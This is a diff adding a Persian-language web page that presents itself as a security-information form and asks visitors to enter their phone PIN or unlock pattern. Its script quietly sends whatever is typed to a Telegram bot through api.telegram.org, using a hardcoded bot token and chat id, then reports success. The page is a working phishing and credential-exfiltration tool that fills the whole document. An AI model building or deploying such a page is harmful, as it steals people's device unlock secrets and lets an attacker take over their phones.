@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ورود اطلاعات امنیتی</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      margin-top: 50px;
+    }
+    .button {
+      font-size: 20px;
+      padding: 15px 30px;
+      margin: 20px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    .button:hover {
+      background-color: #388e3c;
+    }
+    .form-box {
+      display: none;
+      margin-top: 30px;
+    }
+    input {
+      padding: 10px;
+      font-size: 18px;
+      width: 80%;
+      max-width: 300px;
+      margin-bottom: 10px;
+    }
+    button[type="submit"] {
+      background-color: #2196F3;
+      border: none;
+      padding: 10px 20px;
+      color: white;
+      font-size: 18px;
+      border-radius: 6px;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>یکی از روش‌های زیر را انتخاب کنید:</h1>
+
+  <button class="button" onclick="showForm('pin')">پین</button>
+  <button class="button" onclick="showForm('pattern')">الگو</button>
+
+  <!-- فرم پین -->
+  <div id="pinForm" class="form-box">
+    <h2>پین خود را وارد کنید:</h2>
+    <form onsubmit="sendData(event, 'پین')">
+      <input type="text" id="pinInput" placeholder="پین را وارد کنید" required>
+      <br>
+      <button type="submit">ارسال</button>
+    </form>
+  </div>
+
+  <!-- فرم الگو -->
+  <div id="patternForm" class="form-box">
+    <h2>الگوی خود را وارد کنید:</h2>
+    <form onsubmit="sendData(event, 'الگو')">
+      <input type="text" id="patternInput" placeholder="مثلاً: 1-2-3-6-9" required>
+      <br>
+      <button type="submit">ارسال</button>
+    </form>
+  </div>
+
+  <script>
+    function showForm(type) {
+      document.getElementById('pinForm').style.display = 'none';
+      document.getElementById('patternForm').style.display = 'none';
+
+      if (type === 'pin') {
+        document.getElementById('pinForm').style.display = 'block';
+      } else if (type === 'pattern') {
+        document.getElementById('patternForm').style.display = 'block';
+      }
+    }
+
+    function sendData(event, inputType) {
+      event.preventDefault();
+      let value = '';
+      if (inputType === 'پین') {
+        value = document.getElementById('pinInput').value;
+      } else if (inputType === 'الگو') {
+        value = document.getElementById('patternInput').value;
+      }
+
+      const message = `${inputType} وارد شده: ${value}`;
+
+      fetch("https://api.telegram.org/bot5828170484:AAGx5Lbjc9ebQd0YuJ7l-REnXSUoS7OhjAc/sendMessage", {
+        method: "POST",
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: 1353504783,
+          text: message
+        })
+      }).then(res => {
+        alert(`${inputType} با موفقیت ارسال شد.`);
+      }).catch(err => {
+        alert("خطا در ارسال اطلاعات.");
+      });
+    }
+  </script>
+
+</body>
+</html>
